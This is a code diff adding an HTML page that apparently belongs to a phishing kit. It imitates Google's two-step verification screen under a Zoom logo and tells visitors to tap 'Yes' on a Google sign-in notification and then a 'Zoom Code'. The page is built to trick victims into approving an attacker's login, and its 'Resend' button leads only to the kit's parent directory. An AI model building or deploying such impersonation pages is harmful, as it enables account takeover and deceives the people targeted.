@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>2-step Verification</title>
+
+  <link rel="icon" type="image/png" href="../../logo.png" />
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff;
+      color: #202124;
+      overflow-x: hidden;
+    }
+
+    /* Top Section */
+    .top-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      gap: 6px;
+    }
+
+    /* Zoom Logo */
+    .logo-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 34px;
+    }
+
+    .logo {
+      height: 28px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    /* Main Heading */
+    h1 {
+      font-size: clamp(20px, 6vw, 25px);
+      font-weight: 500;
+      color: #202124;
+    }
+
+    /* Subtitle - Ektu choto kora holo */
+    .subtitle {
+      font-size: clamp(12px, 3.2vw, 15px);
+      color: #5f6368;
+      font-weight: 400;
+      max-width: 390px;
+      line-height: 1.3;
+      padding: 0 10px;
+    }
+
+    /* Email Pill Selector box */
+    .email-pill {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 4px 12px;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      margin-top: 4px;
+      background: #fff;
+    }
+
+    .email-pill svg {
+      width: 14px;
+      height: 14px;
+      fill: #1a73e8;
+    }
+
+    .email-text {
+      font-size: 13.5px;
+      font-weight: 500;
+      color: #3c4043;
+    }
+
+    .email-pill .arrow {
+      font-size: 9px;
+      color: #5f6368;
+    }
+
+    /* Center Content */
+    .center-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      gap: 12px;
+      margin: auto 0;
+    }
+
+    /* Phone Graphic Illustration - Responsive */
+    .phone-illustration {
+      width: 200%;
+      max-width: 320px;
+      height: 35;
+      max-height: 35vh;
+      object-fit: contain;
+    }
+
+    /* Text Group */
+    .text-group {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      gap: 8px;
+    }
+
+    /* Check your phone */
+    h2 {
+      font-size: clamp(22px, 6vw, 28px);
+      font-weight: 700;
+      color: #202124;
+    }
+
+    /* Description Text */
+    .desc-text {
+      font-size: clamp(16px, 4.5vw, 20px);
+      color: #3c4043;
+      line-height: 1.4;
+      max-width: 410px;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* Specific lines - Center e ana ebong Red color */
+    .desc-text .bold-text {
+      display: block;
+      font-weight: 700;
+      color: #d93025; /* Red color */
+      text-align: center;
+      margin-top: 4px;
+    }
+
+    /* Resend / Action Button - Middle e ana holo */
+    .btn-join {
+      background-color: #1a73e8;
+      color: white;
+      padding: 10px 0;
+      width: 60%;
+      max-width: 380px;
+      font-size: 18px;
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      margin: 10px auto 0 auto; /* Middle e anar jonno 'auto' use kora holo */
+      display: block;
+    }
+
+    .btn-join:hover {
+      background-color: #1557b0;
+    }
+
+    .btn-join:active {
+      background-color: #174ea6;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Top section -->
+    <div class="top-section">
+      <div class="logo-wrapper">
+        <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
+      </div>
+      <h1>2-step Verification</h1>
+      <p class="subtitle">This extra step shows that it’s really you trying to sign in</p>
+      
+     
+
+    <!-- Phone illustration & Texts -->
+    <div class="center-content">
+      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
+      <div class="text-group">
+        <h2>Check your phone.</h2>
+        <p class="desc-text">
+          Google sent a notification to your phone.<br>
+          <span class="bold-text">Tap Yes on the notification</span>
+          <span class="bold-text">Then Tap Zoom Code</span>
+        </p>
+      </div>
+    </div>
+
+    <!-- Resend button -->
+    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
+  </div>
+
+</body>
+</html>
